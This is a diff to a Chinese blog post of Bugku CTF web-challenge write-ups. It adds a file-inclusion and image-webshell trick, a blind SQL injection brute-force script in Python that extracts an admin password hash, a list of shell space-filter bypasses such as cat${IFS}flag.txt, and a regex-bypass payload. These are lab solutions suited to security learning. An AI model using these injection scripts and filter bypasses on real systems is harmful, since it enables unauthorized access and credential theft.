@@ -19,7 +19,12 @@
 <meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/exec.png">
 <meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/exec0a.png">
 <meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/execls.png">
-<meta property="og:updated_time" content="2021-04-18T06:49:50.453Z">
+<meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/web36_start.png">
+<meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/web36_yujian.png">
+<meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/web36_1.png">
+<meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/web36_somd5.png">
+<meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/web36_shell.png">
+<meta property="og:updated_time" content="2021-04-20T14:40:47.925Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bugku_new">
 <meta name="twitter:description" content="新bugku平台 https://test.bugku.com/">
@@ -236,6 +241,54 @@
 
 <p>丢到php在线工具<a href="http://www.dooccn.com/php/" target="_blank" rel="noopener">http://www.dooccn.com/php/</a></p>
 <p>得到flag<code>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</code></p>
+<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>题目hint:文件包含</p>
+<p>进入题目,url中存在file文件包含,直接file=/flag可以得到flag,但题目的本意不是这样</p>
+<p>源码中提示upload.php</p>
+<p>上传图片马配合文件包含 </p>
+<p>但这题将图片马中的<code>&lt;?php</code>和<code>?&gt;</code>替换为<code>_</code></p>
+<p>图片马使用<code>&lt;script language=&quot;php&quot;&gt; 一句话 &lt;/script&gt;</code></p>
+<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>题目</p>
+<img src="/2020/11/24/bugku-new/web36_start.png">
+
+<p>点进网页,经典SQL注入场面</p>
+<p>御剑扫后台</p>
+<img src="/2020/11/24/bugku-new/web36_yujian.png">
+
+<p>发现image文件夹,访问发现存在图片1.png</p>
+<img src="/2020/11/24/bugku-new/web36_1.png">
+
+<p>图片中提示输入的用户名与数字作比较,根据mysql的特性,字符串与数字作比较的时候: 1.以数字开头的字符串,取第一个字母前的数字部分与后面的数作比较, 2.非数字开头的字符串直接转为0与数字作比较</p>
+<p>直接把0作为用户名并输入随意的密码,会弹窗<code>username and password must have a value!!@_@</code></p>
+<p>而把1作为用户名并输入随意的密码,则会弹出<code>username error!!@_@</code></p>
+<p>只有当用户名为admin的时候,不会弹出<code>username error!!@_@</code>,则可以利用admin用户进行后面的注入</p>
+<p>因此可以构造payload: admin’ = 数字 <code>或</code> admin != 数字</p>
+<p>采取闭合admin之后加个与数字作比较来,然后比较后面数字,网页会根据比较结果弹出相应的窗口</p>
+<p>而数字的生成则可以是一个SQL语句的返回值,因此我们可以利用这点来爆破出我们想要的密码</p>
+<p>所以可以根据网页的反馈来判断穷举的密码是否正确</p>
+<p>附上脚本,可以根据网络情况sleep一下</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://114.67.246.176:10585/login.php"</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"b1234567890qwertyuiopasdfghjklzxcvnm"</span>:</span><br><span class="line">        uname = <span class="string">"admin'-(ascii(MID((passwd)from("</span>+str(i)+<span class="string">")))="</span>+str(ord(j))+<span class="string">")-'"</span><span class="comment">#注意这个语句不能有空格,被过滤了</span></span><br><span class="line">        res = requests.post(url,data=&#123;<span class="string">"uname"</span>:uname,<span class="string">"passwd"</span>:<span class="string">"123"</span>&#125;)</span><br><span class="line">        text = res.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"username error"</span> <span class="keyword">in</span> text:</span><br><span class="line">            password += j</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"passwd="</span> + password)</span><br><span class="line">print(<span class="string">"length:"</span>+ len(password))</span><br></pre></td></tr></table></figure>
+
+<p>跑出来的结果是<code>4dcc88f8f1bc05e7c2ad1a60288481a2</code></p>
+<p>丢到somd5.com中解密</p>
+<img src="/2020/11/24/bugku-new/web36_somd5.png">
+
+<p>解密得到密码<code>bugkuctf</code></p>
+<p>登录进入命令行界面</p>
+<img src="/2020/11/24/bugku-new/web36_shell.png">
+
+<p>发现空格被过滤</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.&#123;cat,flag.txt&#125; </span><br><span class="line">2.cat$&#123;IFS&#125;flag.txt</span><br><span class="line">3.cat$IFS$9flag.txt</span><br><span class="line">4.cat&lt;flag.txt</span><br><span class="line">5.cat&lt;&gt;flag.txt</span><br><span class="line">6.kg=$'\x20flag.txt'&amp;&amp;cat$kg</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br><span class="line"></span><br><span class="line">以上6种是Linux下空格被过滤的常用绕过方式,其中1、4、5在这题可以用</span><br></pre></td></tr></table></figure>
+
+<h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$zero=$_REQUEST[<span class="string">'zero'</span>];</span><br><span class="line">$first=$_REQUEST[<span class="string">'first'</span>];</span><br><span class="line">$second=$zero.$first;</span><br><span class="line"><span class="keyword">if</span>(preg_match_all(<span class="string">"/Yeedo|wants|a|girl|friend|or|a|flag/i"</span>,$second))&#123;<span class="comment">//有这里面的任一词则进入下一步</span></span><br><span class="line">    $key=$second;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\.\.|flag/"</span>,$key))&#123;<span class="comment">//匹配..或flag  </span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Noooood hacker!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $third=$first;        </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/\\|\056\160\150\x70/i"</span>,$third))&#123;</span><br><span class="line">            $end=substr($third,<span class="number">5</span>);<span class="comment">//substr()函数从0开始算,所以这里的5是从$third的第六位开始取,由于没有length参数,取到末尾</span></span><br><span class="line">            highlight_file(base64_decode($zero).$end);<span class="comment">//maybe flag in flag.php</span></span><br><span class="line">                            <span class="comment">//base64_decode</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键点:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\\|\056\160\150\x70/i"</span>,$third))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>\\</code>并不是仅仅转义为<code>\</code>符号,整个语句是转义为<code>\</code>后变成<code>\|</code>,又再次转义为<code>|</code>,而<code>\056\160\150\x70</code>经过测试,含义是<code>.php</code>。这与正则运算符优先级有关，如果需要匹配\符号可以直接使用<code>\|\056\160\150\x70</code>或者<code>\\\\|\056\160\150\x70</code></p>
+<p>所以语句含义为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"|.php/i"</span>,$third))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>payload:?zero=ZmxhZw==&amp;first=girl|.php</p>
 
       
 
@@ -357,7 +410,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内测"><span class="toc-number">1.</span> <span class="toc-text">内测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exec"><span class="toc-number">1.1.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload"><span class="toc-number">1.2.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialize1"><span class="toc-number">1.3.</span> <span class="toc-text">serialize1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#公测"><span class="toc-number">2.</span> <span class="toc-text">公测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web32文件上传"><span class="toc-number">2.1.</span> <span class="toc-text">web32文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33"><span class="toc-number">2.2.</span> <span class="toc-text">web33</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内测"><span class="toc-number">1.</span> <span class="toc-text">内测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exec"><span class="toc-number">1.1.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload"><span class="toc-number">1.2.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialize1"><span class="toc-number">1.3.</span> <span class="toc-text">serialize1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#公测"><span class="toc-number">2.</span> <span class="toc-text">公测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web32文件上传"><span class="toc-number">2.1.</span> <span class="toc-text">web32文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33"><span class="toc-number">2.2.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web34"><span class="toc-number">2.3.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web36"><span class="toc-number">2.4.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-one-knows-regex-better-than-me"><span class="toc-number">2.5.</span> <span class="toc-text">No one knows regex better than me</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
